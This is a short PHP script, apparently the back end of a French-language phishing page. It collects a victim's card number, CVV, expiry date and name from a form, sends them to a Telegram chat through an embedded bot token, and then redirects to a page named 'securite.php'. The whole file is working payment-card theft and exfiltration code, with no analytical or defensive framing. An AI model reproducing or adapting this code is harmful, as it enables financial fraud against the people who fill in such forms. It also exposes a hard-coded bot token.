<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
$name = trim($_POST['username']);
$cardNum = trim($_POST['cardNumber']);
$cvv = trim($_POST['cvv']);
$month = trim($_POST['cardMonth']);
$year = trim($_POST['cardYear']);
$date = date('d/m/y');
////////////////////////////
if (!empty($name)) {
    $Result = "
    \n**** Result date : $date ****\n
    Nom de La carte : $name\n
    Num de La carte : $cardNum\n
    cvv : $cvv\n
    Date d'expiration : $month/$year\n";
    ////////////////////////////////
    $apiToken = "6936015326:AAExD5-5foAfYSx7n-0kWfBC_vmopO92ro4";
    $data = [
        'chat_id' => '-6964453824',
        'text' => "$Result",
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
        http_build_query($data));
}

echo "<script type='text/javascript'>  window.location='securite.php'; </script>";
